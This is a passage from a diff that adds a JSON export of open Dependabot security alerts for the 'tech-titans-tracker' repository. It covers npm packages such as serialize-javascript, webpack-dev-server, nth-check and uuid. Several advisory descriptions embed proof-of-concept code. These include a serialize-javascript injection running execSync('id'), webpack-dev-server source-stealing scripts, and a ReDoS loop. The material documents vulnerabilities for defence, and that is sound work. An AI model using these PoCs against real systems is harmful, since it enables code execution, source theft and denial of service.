+        }
+      },
+      "epss": {
+        "percentage": 0.00893,
+        "percentile": 0.565
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 5.9
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-674",
+          "name": "Uncontrolled Recursion"
+        },
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "underscore"
+      },
+      "severity": "high",
+      "vulnerable_version_range": "<= 1.13.7",
+      "first_patched_version": {
+        "identifier": "1.13.8"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/7",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/7",
+    "created_at": "2026-08-21T01:04:40Z",
+    "updated_at": "2026-08-21T01:04:40Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 6,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "serialize-javascript"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-5c6j-r48x-rmvq",
+      "cve_id": null,
+      "summary": "Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()",
+      "description": "### Impact\n\nThe serialize-javascript npm package (versions <= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.\n\nWhile `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.\n\nIf an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `<script>` tags), the injected code executes.\n\n```javascript\nconst serialize = require('serialize-javascript');\n// Create an object that passes instanceof RegExp with a spoofed .flags\nconst fakeRegex = Object.create(RegExp.prototype);\nObject.defineProperty(fakeRegex, 'source', { get: () => 'x' });\nObject.defineProperty(fakeRegex, 'flags', {\n  get: () => '\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"'\n});\nfakeRegex.toJSON = function() { return '@placeholder'; };\nconst output = serialize({ re: fakeRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"\")}\nlet obj;\neval('obj = ' + output);\nconsole.log(global.PWNED); // \"CODE_INJECTION_VIA_FLAGS\" — injected code executed!\n#h2. PoC 2: Code Injection via Date.toISOString()\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst fakeDate = Object.create(Date.prototype);\nfakeDate.toISOString = function() { return '\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"'; };\nfakeDate.toJSON = function() { return '2024-01-01'; };\nconst output = serialize({ d: fakeDate });\n// Output: {\"d\":new Date(\"\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"\")}\neval('obj = ' + output);\nconsole.log(global.DATE_PWNED); // \"DATE_INJECTION\" — injected code executed!\n#h2. PoC 3: Remote Code Execution\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst rceRegex = Object.create(RegExp.prototype);\nObject.defineProperty(rceRegex, 'source', { get: () => 'x' });\nObject.defineProperty(rceRegex, 'flags', {\n  get: () => '\"+require(\"child_process\").execSync(\"id\").toString()+\"'\n});\nrceRegex.toJSON = function() { return '@rce'; };\nconst output = serialize({ re: rceRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+require(\"child_process\").execSync(\"id\").toString()+\"\")}\n// When eval'd on a Node.js server, executes the \"id\" system command\n```\n\n### Patches\n\nThe fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3",
+      "severity": "high",
+      "identifiers": [
+        {
+          "value": "GHSA-5c6j-r48x-rmvq",
+          "type": "GHSA"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/yahoo/serialize-javascript/security/advisories/GHSA-5c6j-r48x-rmvq"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7660"
+        },
+        {
+          "url": "https://github.com/yahoo/serialize-javascript/commit/2e609d0a9f4f5b097f0945af88bd45b9c7fb48d9"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-hxcc-f52p-wc94"
+        },
+        {
+          "url": "https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-5c6j-r48x-rmvq"
+        }
+      ],
+      "published_at": "2026-02-28T02:50:45Z",
+      "updated_at": "2026-03-02T16:17:37Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "serialize-javascript"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "<= 7.0.2",
+          "first_patched_version": {
+            "identifier": "7.0.3"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "score": 8.1
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 8.1
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-96",
+          "name": "Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "serialize-javascript"
+      },
+      "severity": "high",
+      "vulnerable_version_range": "<= 7.0.2",
+      "first_patched_version": {
+        "identifier": "7.0.3"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/6",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/6",
+    "created_at": "2026-08-21T01:04:40Z",
+    "updated_at": "2026-08-21T01:04:40Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 5,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "webpack-dev-server"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-9jgg-88mc-972h",
+      "cve_id": "CVE-2025-30360",
+      "summary": "webpack-dev-server users' source code may be stolen when they access a malicious web site with non-Chromium based browser",
+      "description": "### Summary\nSource code may be stolen when you access a malicious web site with non-Chromium based browser.\n\n### Details\nThe `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.\nBut webpack-dev-server always allows IP address `Origin` headers.\nhttps://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127\nThis allows websites that are served on IP addresses to connect WebSocket.\nBy using the same method described in [the article](https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages) linked from CVE-2018-14732, the attacker get the source code.\n\nrelated commit: https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb (note that `checkHost` function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.\n\nThis vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to [the non-HTTPS private access blocking feature](https://developer.chrome.com/blog/private-network-access-update#chrome_94).\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18418233/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `http://{ipaddress}/?target=http://localhost:8080&file=main` with a non-Chromium browser (I used Firefox 134.0.1)\n5. Edit `src/index.js` in the extracted directory\n6. You can see the content of `src/index.js`\n\n![image](https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4)\n\nThe script in the POC site is:\n```js\nwindow.webpackHotUpdate = (...args) => {\n    console.log(...args);\n    for (i in args[1]) {\n        document.body.innerText = args[1][i].toString() + document.body.innerText\n\t    console.log(args[1][i])\n    }\n}\n\nlet params = new URLSearchParams(window.location.search);\nlet target = new URL(params.get('target') || 'http://127.0.0.1:8080');\nlet file = params.get('file')\nlet wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';\nlet wsPort = target.port;\nvar currentHash = '';\nvar currentHash2 = '';\nlet wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`;\nws = new WebSocket(wsTarget);\nws.onmessage = event => {\n    console.log(event.data);\n    if (event.data.match('\"type\":\"ok\"')) {\n        s = document.createElement('script');\n        s.src = `${target}${file}.${currentHash2}.hot-update.js`;\n        document.body.appendChild(s)\n    }\n    r = event.data.match(/\"([0-9a-f]{20})\"/);\n    if (r !== null) {\n        currentHash2 = currentHash;\n        currentHash = r[1];\n        console.log(currentHash, currentHash2);\n    }\n}\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser.",
+      "severity": "medium",
+      "identifiers": [
+        {
+          "value": "GHSA-9jgg-88mc-972h",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2025-30360",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-30360"
+        },
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb"
+        },
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239"
+        },
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127"
+        },
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-9jgg-88mc-972h"
+        }
+      ],
+      "published_at": "2025-06-04T21:09:38Z",
+      "updated_at": "2025-10-03T13:25:56Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "webpack-dev-server"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": "<= 5.2.0",
+          "first_patched_version": {
+            "identifier": "5.2.1"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+          "score": 6.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00301,
+        "percentile": 0.22529
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+        "score": 6.5
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-346",
+          "name": "Origin Validation Error"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "webpack-dev-server"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": "<= 5.2.0",
+      "first_patched_version": {
+        "identifier": "5.2.1"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/5",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/5",
+    "created_at": "2026-08-21T01:04:40Z",
+    "updated_at": "2026-08-21T01:04:40Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 4,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "webpack-dev-server"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-4v9v-hfq4-rm2v",
+      "cve_id": "CVE-2025-30359",
+      "summary": "webpack-dev-server users' source code may be stolen when they access a malicious web site",
+      "description": "### Summary\nSource code may be stolen when you access a malicious web site.\n\n### Details\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http://localhost:8080/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18426585/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https://e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev/`\n5. You can see the source code output in the document and the devtools console.\n\n![image](https://github.com/user-attachments/assets/9d4dcdca-5d24-4c84-a7b4-feb1782bca09)\n\nThe script in the POC site is:\n```js\nlet moduleList\nconst onHandlerSet = (handler) => {\n  console.log('h', handler)\n  moduleList = handler.require.m\n}\n\nconst originalArrayForEach = Array.prototype.forEach\nArray.prototype.forEach = function forEach(callback, thisArg) {\n  callback((handler) => {\n    onHandlerSet(handler)\n  })\n  originalArrayForEach.call(this, callback, thisArg)\n  Array.prototype.forEach = originalArrayForEach\n}\n\nconst script = document.createElement('script')\nscript.src = 'http://localhost:8080/main.js'\nscript.addEventListener('load', () => {\n  console.log(moduleList)\n  for (const key in moduleList) {\n    const p = document.createElement('p')\n    const title = document.createElement('strong')\n    title.textContent = key\n    const code = document.createElement('code')\n    code.textContent = moduleList[key].toString()\n    p.append(title, ':', document.createElement('br'), code)\n    document.body.appendChild(p)\n  }\n})\ndocument.head.appendChild(script)\n```\n\nThis script uses the function generated by [`renderRequire`](https://github.com/webpack/webpack/blob/3919c844eca394d73ca930e4fc5506fb86e2b094/lib/javascript/JavascriptModulesPlugin.js#L1383).\n```js\n    // The require function\n    function __webpack_require__(moduleId) {\n        // Check if module is in cache\n        var cachedModule = __webpack_module_cache__[moduleId];\n        if (cachedModule !== undefined) {\n            return cachedModule.exports;\n        }\n        // Create a new module (and put it into the cache)\n        var module = __webpack_module_cache__[moduleId] = {\n            // no module.id needed\n            // no module.loaded needed\n            exports: {}\n        };\n        // Execute the module function\n        var execOptions = {\n            id: moduleId,\n            module: module,\n            factory: __webpack_modules__[moduleId],\n            require: __webpack_require__\n        };\n        __webpack_require__.i.forEach(function(handler) {\n            handler(execOptions);\n        });\n        module = execOptions.module;\n        execOptions.factory.call(module.exports, module, module.exports, execOptions.require);\n        // Return the exports of the module\n        return module.exports;\n    }\n```\nEspecially, it uses the fact that `Array::forEach` is called for `__webpack_require__.i` and `execOptions` contains `__webpack_require__`.\nIt uses prototype pollution against `Array::forEach` to extract `__webpack_require__` reference.\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and output path for the entrypoint script.\n\n<details>\n<summary>Old content</summary>\n\n### Summary\nSource code may be stolen when you use [`output.iife: false`](https://webpack.js.org/configuration/output/#outputiife) and access a malicious web site.\n\n### Details\nWhen `output.iife: false` is set, some global variables for the webpack runtime are declared on the `window` object (e.g. `__webpack_modules__`).\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http://localhost:8080/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. By running that, the webpack runtime variables will be declared on the `window` object.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\nI pointed out `output.iife: false`, but if there are other options that makes the webpack runtime variables to be declared on the `window` object, the same will apply for those cases.\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18409777/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https://852aafa3-5f83-44da-9fc6-ea116d0e3035.pages.dev/`\n5. Open the devtools console.\n6. You can see the content of `src/index.js` and other scripts loaded.\n\n![image](https://github.com/user-attachments/assets/87801607-57bb-4656-bc0d-2bfbe207f436)\n\nThe script in the POC site is:\n```js\nconst script = document.createElement('script')\nscript.src = 'http://localhost:8080/main.js'\nscript.addEventListener('load', () => {\n    for (const module in window.__webpack_modules__) {\n        console.log(`${module}:`, window.__webpack_modules__[module].toString())\n    }\n})\ndocument.head.appendChild(script)\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that has `output.iife: false` option set and uses a predictable port and output path for the entrypoint script.\n\n</details>",
+      "severity": "medium",
+      "identifiers": [
+        {
+          "value": "GHSA-4v9v-hfq4-rm2v",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2025-30359",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-30359"
+        },
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e"
+        },
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-4v9v-hfq4-rm2v"
+        }
+      ],
+      "published_at": "2025-06-04T21:09:13Z",
+      "updated_at": "2025-10-03T13:25:41Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "webpack-dev-server"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": "<= 5.2.0",
+          "first_patched_version": {
+            "identifier": "5.2.1"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+          "score": 5.3
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00427,
+        "percentile": 0.3551
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+        "score": 5.3
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-749",
+          "name": "Exposed Dangerous Method or Function"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "webpack-dev-server"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": "<= 5.2.0",
+      "first_patched_version": {
+        "identifier": "5.2.1"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/4",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/4",
+    "created_at": "2026-08-21T01:04:40Z",
+    "updated_at": "2026-08-21T01:04:40Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 3,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "postcss"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-7fh5-64p2-3v2j",
+      "cve_id": "CVE-2023-44270",
+      "summary": "PostCSS line return parsing error",
+      "description": "An issue was discovered in PostCSS before 8.4.31. It affects linters using PostCSS to parse external Cascading Style Sheets (CSS). There may be `\\r` discrepancies, as demonstrated by `@font-face{ font:(\\r/*);}` in a rule.\n\nThis vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being originally included in a comment.",
+      "severity": "medium",
+      "identifiers": [
+        {
+          "value": "GHSA-7fh5-64p2-3v2j",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2023-44270",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-44270"
+        },
+        {
+          "url": "https://github.com/postcss/postcss/commit/58cc860b4c1707510c9cd1bc1fa30b423a9ad6c5"
+        },
+        {
+          "url": "https://github.com/postcss/postcss/blob/main/lib/tokenize.js#L25"
+        },
+        {
+          "url": "https://github.com/postcss/postcss/releases/tag/8.4.31"
+        },
+        {
+          "url": "https://github.com/github/advisory-database/issues/2820"
+        },
+        {
+          "url": "https://lists.debian.org/debian-lts-announce/2024/12/msg00025.html"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-7fh5-64p2-3v2j"
+        }
+      ],
+      "published_at": "2023-09-30T00:31:10Z",
+      "updated_at": "2025-11-04T16:45:03Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "postcss"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": "< 8.4.31",
+          "first_patched_version": {
+            "identifier": "8.4.31"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+          "score": 5.3
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00822,
+        "percentile": 0.54521
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+        "score": 5.3
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-74",
+          "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')"
+        },
+        {
+          "cwe_id": "CWE-144",
+          "name": "Improper Neutralization of Line Delimiters"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "postcss"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": "< 8.4.31",
+      "first_patched_version": {
+        "identifier": "8.4.31"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/3",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/3",
+    "created_at": "2026-08-21T01:04:40Z",
+    "updated_at": "2026-08-21T01:04:40Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 2,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "nth-check"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-rp65-9cf3-cjxr",
+      "cve_id": "CVE-2021-3803",
+      "summary": "Inefficient Regular Expression Complexity in nth-check",
+      "description": "There is a Regular Expression Denial of Service (ReDoS) vulnerability in nth-check that causes a denial of service when parsing crafted invalid CSS nth-checks.\n\nThe ReDoS vulnerabilities of the regex are mainly due to the sub-pattern `\\s*(?:([+-]?)\\s*(\\d+))?` with quantified overlapping adjacency and can be exploited with the following code.\n\n**Proof of Concept**\n```js\n// PoC.js\nvar nthCheck = require(\"nth-check\")\nfor(var i = 1; i <= 50000; i++) {\n    var time = Date.now();\n    var attack_str = '2n' + ' '.repeat(i*10000)+\"!\";\n    try {\n        nthCheck.parse(attack_str) \n    }\n    catch(err) {\n        var time_cost = Date.now() - time;\n        console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\n    }\n}\n```\n\n**The Output**\n```\nattack_str.length: 10003: 174 ms\nattack_str.length: 20003: 1427 ms\nattack_str.length: 30003: 2602 ms\nattack_str.length: 40003: 4378 ms\nattack_str.length: 50003: 7473 ms\n```",
+      "severity": "high",
+      "identifiers": [
+        {
+          "value": "GHSA-rp65-9cf3-cjxr",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2021-3803",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3803"
+        },
+        {
+          "url": "https://github.com/fb55/nth-check/commit/9894c1d2010870c351f66c6f6efcf656e26bb726"
+        },
+        {
+          "url": "https://huntr.dev/bounties/8cf8cc06-d2cf-4b4e-b42c-99fafb0b04d0"
+        },
+        {
+          "url": "https://lists.debian.org/debian-lts-announce/2023/05/msg00023.html"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-rp65-9cf3-cjxr"
+        }
+      ],
+      "published_at": "2021-09-20T20:47:31Z",
+      "updated_at": "2023-11-29T22:11:25Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "nth-check"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "< 2.0.1",
+          "first_patched_version": {
+            "identifier": "2.0.1"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.02165,
+        "percentile": 0.8051
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "nth-check"
+      },
+      "severity": "high",
+      "vulnerable_version_range": "< 2.0.1",
+      "first_patched_version": {
+        "identifier": "2.0.1"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/2",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/2",
+    "created_at": "2026-08-21T01:04:40Z",
+    "updated_at": "2026-08-21T01:04:40Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 1,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "uuid"
+      },
+      "manifest_path": "tech-titans-tracker/functions/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-w5hq-g745-h8pq",
+      "cve_id": "CVE-2026-41907",
+      "summary": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+      "description": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=>v4({},new Uint8Array(8),4)],\n  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+      "severity": "medium",
+      "identifiers": [
+        {
